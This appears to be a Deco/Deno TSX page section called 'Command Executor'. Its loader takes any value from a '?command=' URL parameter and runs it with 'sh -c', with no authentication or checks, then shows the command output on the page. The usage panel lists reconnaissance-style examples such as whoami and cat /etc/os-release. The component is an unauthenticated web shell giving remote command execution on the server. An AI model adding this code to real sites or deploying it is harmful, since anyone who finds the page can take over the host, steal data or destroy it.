import type { SectionProps } from "@deco/deco";

export interface Props {
  title?: string;
}

interface CommandResult {
  command: string;
  output: string;
  error?: string;
  executedAt: string;
}

export const loader = async (props: Props, req: Request): Promise<Props & { result?: CommandResult }> => {
  const url = new URL(req.url);
  const command = url.searchParams.get("command");

  if (!command) {
    return props;
  }

  try {
    // Execute the command using Deno
    const process = new Deno.Command("sh", {
      args: ["-c", command],
      stdout: "piped",
      stderr: "piped",
    });

    const { code, stdout, stderr } = await process.output();
    const output = new TextDecoder().decode(stdout);
    const errorOutput = new TextDecoder().decode(stderr);

    return {
      ...props,
      result: {
        command,
        output: output || "(no output)",
        error: code !== 0 ? errorOutput : undefined,
        executedAt: new Date().toISOString(),
      },
    };
  } catch (error) {
    return {
      ...props,
      result: {
        command,
        output: "",
        error: error instanceof Error ? error.message : "Unknown error occurred",
        executedAt: new Date().toISOString(),
      },
    };
  }
};

export default function CommandExecutor({ 
  title = "Command Executor",
  result 
}: SectionProps<typeof loader>) {
  return (
    <div class="container mx-auto px-4 py-8">
      <div class="max-w-4xl mx-auto">
        <h1 class="text-3xl font-bold mb-6">{title}</h1>
        
        {!result ? (
          <div class="bg-blue-50 border border-blue-200 rounded-lg p-6">
            <h2 class="text-xl font-semibold mb-4">How to use:</h2>
            <p class="mb-4">Add a <code class="bg-blue-100 px-2 py-1 rounded">?command=</code> parameter to the URL to execute Linux commands.</p>
            
            <div class="space-y-2">
              <p class="font-semibold">Examples:</p>
              <ul class="list-disc list-inside space-y-2 ml-4">
                <li>
                  <code class="bg-gray-100 px-2 py-1 rounded text-sm">?command=ls</code> - List files
                </li>
                <li>
                  <code class="bg-gray-100 px-2 py-1 rounded text-sm">?command=pwd</code> - Print working directory
                </li>
                <li>
                  <code class="bg-gray-100 px-2 py-1 rounded text-sm">?command=whoami</code> - Current user
                </li>
                <li>
                  <code class="bg-gray-100 px-2 py-1 rounded text-sm">?command=date</code> - Current date/time
                </li>
                <li>
                  <code class="bg-gray-100 px-2 py-1 rounded text-sm">?command=df -h</code> - Disk usage
                </li>
                <li>
                  <code class="bg-gray-100 px-2 py-1 rounded text-sm">?command=cat /etc/os-release</code> - OS info
                </li>
              </ul>
            </div>

            <div class="mt-6 p-4 bg-yellow-50 border border-yellow-200 rounded">
              <p class="text-sm text-yellow-800">
                ⚠️ <strong>Warning:</strong> Be careful with commands that modify files or system state.
              </p>
            </div>
          </div>
        ) : (
          <div class="space-y-4">
            <div class="bg-gray-100 rounded-lg p-4">
              <div class="flex items-center justify-between mb-2">
                <h2 class="text-lg font-semibold">Command:</h2>
                <span class="text-sm text-gray-500">{result.executedAt}</span>
              </div>
              <code class="block bg-gray-800 text-green-400 p-3 rounded font-mono text-sm">
                $ {result.command}
              </code>
            </div>

            {result.error ? (
              <div class="bg-red-50 border border-red-200 rounded-lg p-4">
                <h3 class="text-lg font-semibold text-red-800 mb-2">Error:</h3>
                <pre class="bg-red-100 p-3 rounded overflow-x-auto text-sm text-red-900 whitespace-pre-wrap">
                  {result.error}
                </pre>
              </div>
            ) : (
              <div class="bg-green-50 border border-green-200 rounded-lg p-4">
                <h3 class="text-lg font-semibold text-green-800 mb-2">Output:</h3>
                <pre class="bg-white p-3 rounded overflow-x-auto text-sm max-h-96 overflow-y-auto whitespace-pre-wrap border">
                  {result.output}
                </pre>
                <p class="text-sm text-gray-500 mt-2">
                  {result.output.length} characters
                </p>
              </div>
            )}

            <div class="bg-gray-50 border border-gray-200 rounded-lg p-4">
              <p class="text-sm text-gray-600">
                Try another command by changing the <code class="bg-gray-200 px-2 py-1 rounded">?command=</code> parameter
              </p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}